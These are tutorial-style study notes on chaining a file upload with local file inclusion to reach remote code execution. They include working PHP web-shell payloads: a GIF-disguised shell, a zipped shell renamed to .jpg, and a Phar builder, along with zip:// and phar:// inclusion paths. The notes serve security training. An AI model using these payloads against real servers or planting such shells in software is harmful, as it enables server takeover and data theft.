This section explains how an **existing file-upload functionality can be combined with an LFI vulnerability** to potentially achieve **Remote Code Execution (RCE)**.

The key point is:

> **The upload functionality itself does not need to be vulnerable.** It only needs to allow us to store a file on the back-end server. If the LFI function has **code-execution capabilities**, including the uploaded file may cause the code inside it to execute.

![Image](https://images.openai.com/static-rsc-4/v2VzHcZNwnAUbPK4WRJJraSv8Gec_zGOwFAYORIQNSUy1QPkk0NfwuSvjfCBHwBSm-c43k3p-MIVtXUzBWns8f-0EMYjQK15ipGjbDxYkJmZG-J01i0pESvZXAJ_B0Jds8gAwXRw55tfYsf0OyoQryrYuH3Z037bc8qMVutzOa768_2ODbN7Fr-ITsNxnCqB?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/ivxjR8HzsGD3-h9N0KumfRMN31BtDGBV1b4R_cPkvfXrfgl-yT7kCDdItMcJGsoCKwbWKNbs1Pq_L4ixfBIyfDxSFGNIKBGLdFQ30_8SA-2x6cwuo4BzEu70zbQI_ob735v8CWgOxBTauxPU39-A7fKG9aX54IhQ_GloVOUDSBDO9T_P8pOLEY68WTJ8foKa?purpose=fullsize)

---

## ⭐ 1. Core Attack Concept

The overall attack chain is:

```text
File Upload
     ↓
Upload attacker-controlled file
     ↓
File stored on server
     ↓
Discover uploaded file path
     ↓
LFI vulnerability
     ↓
Include uploaded file
     ↓
PHP/code gets executed
     ↓
Potential RCE
```

The important distinction is:

```text
Upload vulnerability ❌ NOT required

File upload capability ✅ required

LFI with Execute capability ✅ required
```

---

# 2. Why File Upload + LFI Is Powerful

Normally, an application might only allow:

```text
.jpg
.png
.gif
```

and reject:

```text
.php
```

But if the application simply checks that the uploaded file is an image, an attacker may potentially place executable code inside an otherwise accepted file.

For example:

```text
shell.gif
```

could contain PHP code.

By itself:

```text
shell.gif
```

isn't necessarily executed.

But if a vulnerable `include()`-style function processes it:

```text
LFI → shell.gif → PHP interpreter → code execution
```

the embedded PHP code may execute.

---

# ⭐ 3. Functions That Can Execute Included Code

The material provides the following important table:

|Function|Read Content|Execute|Remote URL|
|---|--:|--:|--:|
|PHP `include()` / `include_once()`|✅|✅|✅|
|PHP `require()` / `require_once()`|✅|✅|❌|
|NodeJS `res.render()`|✅|✅|❌|
|Java `import`|✅|✅|✅|
|.NET `include`|✅|✅|✅|

### 🔑 What matters here?

For this particular attack, we need a vulnerable inclusion function with:

```text
Execute = ✅
```

Otherwise, uploading code into a file and including it may only result in the file being read rather than executed.

---

# 🖼️ 4. Image Upload Technique

Image uploads are especially interesting because many applications consider them relatively safe.

The material's approach is to create an image-like file containing PHP code.

Example:

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

The file starts with:

```text
GIF8
```

and contains:

```php
<?php system($_GET["cmd"]); ?>
```

### Why `GIF8`?

The material explains that GIF magic bytes are convenient here because they can be represented with easily typed ASCII characters.

Other file formats may have binary magic bytes, making this approach less convenient.

---

# 🧠 5. Magic Bytes

**Magic bytes** are characteristic bytes at the beginning of a file that can identify its format.

Conceptually:

```text
File
│
├── Magic bytes
│
└── File contents
```

For this technique:

```text
GIF8
<?php ... ?>
```

The goal is to make the file appear sufficiently like an allowed image to the upload functionality while retaining attacker-controlled content.

### Important

This is **not exploiting the image upload itself**.

The upload is functioning normally.

The weakness comes from:

```text
Upload
+
LFI
+
Execute-capable inclusion
```

---

# 6. Upload the Malicious Image

The example uses a profile/avatar upload functionality.

Conceptually:

```text
Profile Settings
       ↓
Choose image
       ↓
shell.gif
       ↓
Upload
       ↓
Server stores file
```

If the upload succeeds, the next challenge is finding **where the file was stored**.

---

# 🔎 7. Finding the Uploaded File Path

This is one of the most important practical steps.

After uploading the file, inspect how the application references it.

For example, the HTML might contain:

```html
<img src="/profile_images/shell.gif"
     class="profile-image"
     id="profile-image">
```

From this, we can determine:

```text
Uploaded file:
/profile_images/shell.gif
```

So the important information is:

```text
Directory = /profile_images/
Filename  = shell.gif
```

---

# ⭐ 8. If the Upload Path Isn't Obvious

Sometimes the application doesn't directly expose the uploaded file's location.

The material suggests:

```text
Fuzz upload directories
        ↓
Find likely upload directory
        ↓
Fuzz for uploaded filename
```

However, this may not work if the application properly hides uploaded files.

So don't assume every upload directory will be discoverable through simple fuzzing.

---

# 🔥 9. Include the Uploaded File Through LFI

Once the file path is known, the attack becomes:

```text
Uploaded file
      ↓
/profile_images/shell.gif
      ↓
LFI parameter
      ↓
Include()
      ↓
PHP code execution
```

The example uses:

```text
./profile_images/shell.gif
```

and then passes a command through the web shell.

The key idea is:

> **The file extension does not necessarily protect the server if the vulnerable inclusion function executes the contents of the included file.**

---

# ⭐ 10. Directory Prefix Matters

A very important detail from the material:

The vulnerable application in the example does **not** automatically prepend another directory.

Therefore:

```text
./profile_images/shell.gif
```

works directly.

But imagine the application does something like:

```php
include("./languages/" . $_GET['language']);
```

Then your input initially lands under:

```text
./languages/
```

In that situation, you would need to traverse out of that directory before reaching the uploaded file.

Conceptually:

```text
./languages/
      ↓
../
      ↓
profile_images/
      ↓
shell.gif
```

This connects directly with the **approved paths and directory traversal bypasses** from the previous notes.

---

# 🧩 11. Complete Image Upload Attack Chain

```text
                  LFI
                   │
                   │
        ┌──────────▼──────────┐
        │                     │
   File upload            Inclusion
        │                     │
        ▼                     │
  shell.gif                   │
        │                     │
        ▼                     │
 Find upload path             │
        │                     │
        └──────────┬──────────┘
                   ▼
             Include file
                   │
                   ▼
            Code execution
                   │
                   ▼
                  RCE
```

---

# ⭐ 12. Why This Method Is Considered Reliable

The material explicitly describes this technique as **very reliable** and applicable across many web frameworks, provided the vulnerable function allows code execution.

Compared with the PHP-specific `zip://` and `phar://` techniques discussed later:

```text
Image upload + LFI
        ↓
Most reliable
```

while:

```text
zip wrapper
        ↓
Alternative

phar wrapper
        ↓
Alternative
```

---

# 📦 13. ZIP Upload Technique

There are alternative PHP-only techniques using wrappers.

The first is:

```text
zip://
```

The basic idea is:

```text
PHP shell
   ↓
ZIP archive
   ↓
Upload archive
   ↓
LFI
   ↓
zip://
   ↓
Access PHP file inside archive
   ↓
Execution
```

---

# 14. Creating the ZIP Archive

The source creates a PHP file and places it inside an archive:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Notice something interesting:

```text
Actual format → ZIP
Filename      → shell.jpg
```

So the file is named like an image but contains a ZIP archive.

---

# ⚠️ 15. ZIP Upload Limitation

Renaming the archive to:

```text
shell.jpg
```

doesn't necessarily bypass all upload validation.

A properly implemented upload system may inspect the actual file contents or MIME/content type and recognize that:

```text
shell.jpg
```

is actually a ZIP archive.

Therefore, according to the material, this technique has a higher chance of working when **ZIP uploads are already allowed**.

---

# 16. `zip://` Wrapper

After uploading the archive, PHP's ZIP wrapper can reference a file inside it.

Conceptually:

```text
zip://
   │
   └── uploaded archive
           │
           └── shell.php
```

The material's example references:

```text
zip://./profile_images/shell.jpg#shell.php
```

with the `#` portion URL encoded when placed in the URL.

---

# ⭐ 17. Why ZIP Works

The archive contains:

```text
shell.jpg
└── shell.php
```

The wrapper allows PHP to access:

```text
shell.php
```

inside the archive.

So:

```text
LFI
 ↓
zip://
 ↓
archive
 ↓
embedded PHP
 ↓
execution
```

---

# 🧪 18. ZIP Technique Requirements

For this method to work, you need:

- PHP environment
    
- LFI vulnerability
    
- Inclusion function capable of executing code
    
- ZIP wrapper support
    
- Ability to upload the archive
    
- Correct path to the uploaded archive
    
- PHP file embedded in the archive
    

The material notes that the ZIP wrapper is **not enabled by default**, so it should be viewed as an alternative technique.

---

# 🐘 19. Phar Upload Technique

Another PHP-specific alternative is:

```text
phar://
```

The concept is similar:

```text
Create Phar
     ↓
Put PHP code inside Phar
     ↓
Rename/archive as allowed upload type
     ↓
Upload
     ↓
LFI
     ↓
phar://
     ↓
Access embedded file
     ↓
Code execution
```

---

# 20. Creating the Phar

The material provides this PHP code:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

The important parts are:

### Create Phar

```php
new Phar('shell.phar');
```

### Add a file

```php
addFromString('shell.txt', '...');
```

This creates:

```text
shell.txt
```

inside the Phar archive.

### Set the stub

```php
__HALT_COMPILER();
```

This defines the Phar stub behavior.

---

# 21. Compile the Phar

The source uses:

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

This produces:

```text
shell.phar
```

and renames it:

```text
shell.jpg
```

Again, the filename is being made to resemble an allowed upload type.

---

# ⭐ 22. Accessing the Phar

After upload, the `phar://` wrapper can reference the uploaded archive and the internal file.

Conceptually:

```text
phar://
   │
   └── shell.jpg
          │
          └── shell.txt
```

The material's example uses:

```text
phar://./profile_images/shell.jpg/shell.txt
```

with the relevant separator URL encoded when necessary.

---

# 23. ZIP vs Phar vs Direct Upload

|Technique|Main Component|PHP-specific?|Reliability|
|---|---|--:|---|
|**Direct uploaded file**|LFI + uploaded file|❌|⭐⭐⭐⭐⭐|
|**ZIP wrapper**|`zip://`|✅|⭐⭐⭐|
|**Phar wrapper**|`phar://`|✅|⭐⭐⭐|

### Recommended order from the material:

```text
1️⃣ Direct uploaded file
       ↓
2️⃣ ZIP wrapper
       ↓
3️⃣ Phar wrapper
```

The direct uploaded-file method is presented as the **most reliable** of the three.

---

# 🧠 24. Critical Difference: Upload vs Execution

This is probably the most important concept to understand.

Simply uploading:

```text
shell.php
```

doesn't automatically give RCE.

Likewise, simply having:

```text
LFI
```

doesn't automatically give RCE.

The interesting combination is:

```text
          Upload
            +
            LFI
            +
     Execute capability
            =
           RCE
```

---

# ⚠️ 25. Obsolete `phpinfo()` Technique

The source briefly mentions another historical technique involving:

```text
LFI
+
File uploads
+
Old PHP
+
Exposed phpinfo()
```

This technique is described as:

- obsolete
    
- uncommon
    
- dependent on very specific conditions
    

Therefore, it is **not one of the primary techniques** in this section.

---

# 🎯 26. Method Selection

When faced with **LFI + file upload**, think in this order:

### Step 1

Determine whether the LFI function can **execute** included code.

```text
Execute = ?
```

### Step 2

Determine what file types the upload accepts.

```text
PHP allowed?
Image allowed?
ZIP allowed?
Other formats?
```

### Step 3

If images are accepted, consider the direct uploaded-file technique.

```text
allowed image
      +
embedded code
      +
LFI
```

### Step 4

Find the actual uploaded file path.

Check:

```text
HTML
page source
application responses
upload directory
```

### Step 5

Include the uploaded file through LFI.

### Step 6

If the direct method isn't suitable and the environment is PHP, consider the alternative wrappers:

```text
zip://
phar://
```

---

# 🔥 27. Exam/CTF Memory Map

```text
             LFI + FILE UPLOAD
                     │
                     ▼
          Does inclusion EXECUTE?
                     │
              ┌──────┴──────┐
              │             │
             NO            YES
              │             │
              ▼             ▼
        Code won't       Upload file
        execute              │
                             ▼
                    Find uploaded path
                             │
                             ▼
                       Include file
                             │
                             ▼
                            RCE
                             │
                    ┌────────┴────────┐
                    │                 │
                Direct file        PHP alternatives
                    │                 │
                    │          ┌──────┴──────┐
                    │          ▼             ▼
                    │       zip://        phar://
                    │
                    ▼
                 Preferred
```

---

# 📌 28. Important Things to Remember

### 🔴 MUST KNOW

**LFI + upload does not automatically equal RCE.**

You need an inclusion mechanism with **execute capabilities**.

---

### 🔴 MUST KNOW

The upload functionality itself **does not have to be vulnerable**.

It only needs to let you store attacker-controlled content.

---

### 🔴 MUST KNOW

An allowed image can potentially contain executable code if the inclusion function processes its contents as PHP.

---

### 🔴 MUST KNOW

Always determine the **actual uploaded file path** before attempting inclusion.

---

### 🔴 MUST KNOW

If the LFI function prefixes a directory, you may need to traverse out of that directory before referencing the uploaded file.

---

### 🔴 MUST KNOW

For PHP, alternative techniques include:

```text
zip://
phar://
```

but the material presents the direct upload method as the most reliable.

---

# ⚡ 29. One-Minute Revision

```text
LFI + File Upload
        ↓
Upload doesn't need to be vulnerable
        ↓
Need Execute-capable inclusion
        ↓
Upload attacker-controlled content
        ↓
Find uploaded file path
        ↓
Include through LFI
        ↓
Embedded code executes
        ↓
RCE
```

### Three techniques:

```text
1. Direct uploaded file ⭐⭐⭐⭐⭐
2. ZIP → zip://       ⭐⭐⭐
3. Phar → phar://     ⭐⭐⭐
```

### Core formula:

> **Upload attacker-controlled content + an LFI function capable of executing included content = potential RCE.**